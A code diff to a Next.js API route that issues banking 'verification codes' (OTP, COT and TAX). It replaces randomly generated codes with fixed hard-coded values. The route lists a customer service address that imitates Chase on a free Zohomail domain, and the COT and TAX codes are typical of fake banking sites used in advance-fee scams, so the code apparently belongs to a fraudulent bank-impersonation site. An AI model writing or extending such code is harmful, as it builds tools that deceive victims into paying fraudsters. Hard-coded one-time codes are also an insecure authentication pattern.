@@ -2,6 +2,13 @@ import { NextRequest, NextResponse } from "next/server"
 
 const CUSTOMER_SERVICE_EMAIL = "chase.org_info247@zohomail.com"
 
+// Fixed verification codes - must match banking-context.tsx VERIFICATION_CODES
+const VERIFICATION_CODES = {
+  OTP: "330668",
+  COT: "92115",
+  TAX: "HM36RC",
+}
+
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json()
@@ -15,11 +22,11 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    // Generate the verification code based on type
+    // Use the fixed verification codes that match banking-context
     const codes: Record<string, string> = {
-      otp: generateSecureCode(6, "numeric"),
-      cot: generateSecureCode(6, "alphanumeric"),
-      tax: generateSecureCode(8, "alphanumeric"),
+      otp: VERIFICATION_CODES.OTP,
+      cot: VERIFICATION_CODES.COT,
+      tax: VERIFICATION_CODES.TAX,
     }
 
     const code = codes[type]
@@ -65,26 +72,6 @@ export async function POST(request: NextRequest) {
       { status: 500 }
     )
   }
-}
-
-/**
- * Generate secure verification code
- */
-function generateSecureCode(length: number, format: "numeric" | "alphanumeric"): string {
-  if (format === "numeric") {
-    return Math.floor(Math.random() * Math.pow(10, length))
-      .toString()
-      .padStart(length, "0")
-  }
-
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-  let code = ""
-
-  for (let i = 0; i < length; i++) {
-    code += chars.charAt(Math.floor(Math.random() * chars.length))
-  }
-
-  return code
 }
 
 /**
